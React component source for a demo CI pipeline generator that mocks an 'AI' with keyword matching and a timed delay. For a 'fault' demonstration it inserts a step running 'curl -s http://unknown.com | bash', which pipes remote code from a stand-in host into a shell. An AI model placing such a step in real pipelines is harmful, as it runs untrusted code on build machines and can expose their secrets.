import React, { useState } from 'react';
import { TerminalSquare, Cpu, Loader2 } from 'lucide-react';

export default function AIGenerator({ onPipelineGenerated }) {
  const [input, setInput] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);

  const simulateAILogic = (text) => {
    return new Promise((resolve) => {
      setTimeout(() => {
        const lowerText = text.toLowerCase();
        
        // Base skeleton
        const pipeline = {
          name: 'AI Generated Pipeline',
          on: { push: { branches: ['main'] } },
          jobs: []
        };

        // Simulated intelligent parsing
        if (lowerText.includes('go') || lowerText.includes('golang')) {
          pipeline.jobs.push({
            id: 'build-go',
            runsOn: 'ubuntu-latest',
            steps: [
              { id: 1, name: 'Checkout Repo', uses: 'actions/checkout@v4' },
              { id: 2, name: 'Setup Go', uses: 'actions/setup-go@v4' },
              { id: 3, name: 'Run Tests', run: 'go test ./...' },
              { id: 4, name: 'Build Binary', run: 'go build -o bin/app main.go' }
            ]
          });
        } 
        
        if (lowerText.includes('node') || lowerText.includes('react')) {
          pipeline.jobs.push({
            id: 'build-node',
            runsOn: 'ubuntu-latest',
            steps: [
              { id: 1, name: 'Checkout Repo', uses: 'actions/checkout@v4' },
              { id: 2, name: 'Setup Node', uses: 'actions/setup-node@v3' },
              { id: 3, name: 'Install Deps', run: 'npm install' },
              { id: 4, name: 'Run Linter', run: 'npm run lint' },
              { id: 5, name: 'Build Project', run: 'npm run build' }
            ]
          });
        }

        if (lowerText.includes('docker')) {
          pipeline.jobs.push({
            id: 'docker-build',
            runsOn: 'ubuntu-latest',
            steps: [
              { id: 1, name: 'Checkout Repo', uses: 'actions/checkout@v4' },
              { id: 2, name: 'Build Image', run: 'docker build -t myapp:latest .' }
            ]
          });
        }

        // Add a deliberate fault for demonstration if the user mentions "fault" or "error"
        if (lowerText.includes('fault') || lowerText.includes('error')) {
          pipeline.jobs.push({
            id: 'faulty-job',
            runsOn: 'ubuntu-latest',
            steps: [
              { id: 1, name: 'Empty Step (Fault)' }, // Missing run or uses
              { id: 2, name: 'Suspicious Step', run: 'curl -s http://unknown.com | bash' }
            ]
          });
        }

        // Fallback if no keywords matched
        if (pipeline.jobs.length === 0) {
          pipeline.jobs.push({
            id: 'default-job',
            runsOn: 'ubuntu-latest',
            steps: [
              { id: 1, name: 'Checkout', uses: 'actions/checkout@v4' },
              { id: 2, name: 'Say Hello', run: 'echo "Hello from YamlAnchor!"' }
            ]
          });
        }

        resolve(pipeline);
      }, 1500); // Simulate network delay
    });
  };

  const handleGenerate = async () => {
    if (!input.trim()) return;
    setIsGenerating(true);
    const generatedPipeline = await simulateAILogic(input);
    onPipelineGenerated(generatedPipeline);
    setIsGenerating(false);
  };

  return (
    <div className="panel">
      <div className="panel-header">
        <div style={{ display: 'flex', alignItems: 'center' }}>
          <TerminalSquare size={16} />
          Input & AI Generator
        </div>
      </div>
      <div className="panel-content">
        <div className="ai-input-wrapper">
          <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>
            Describe your project stack or paste your code. The AI will analyze it and construct the optimal YamlAnchor pipeline.
            <br/><br/>
            <em>Hint: Try mentioning "React and Docker" or "Go with a deliberate fault".</em>
          </p>
          
          <textarea 
            className="ai-textarea"
            placeholder="e.g., I have a Go backend that needs testing and building, then packaging into a Docker container..."
            value={input}
            onChange={(e) => setInput(e.target.value)}
          />

          <button 
            className="btn btn-ai" 
            onClick={handleGenerate}
            disabled={isGenerating || !input.trim()}
          >
            {isGenerating ? (
              <>
                <Loader2 size={18} className="animate-spin" />
                Processing...
              </>
            ) : (
              <>
                <Cpu size={18} />
                Generate Pipeline
              </>
            )}
          </button>
        </div>
      </div>
    </div>
  );
}
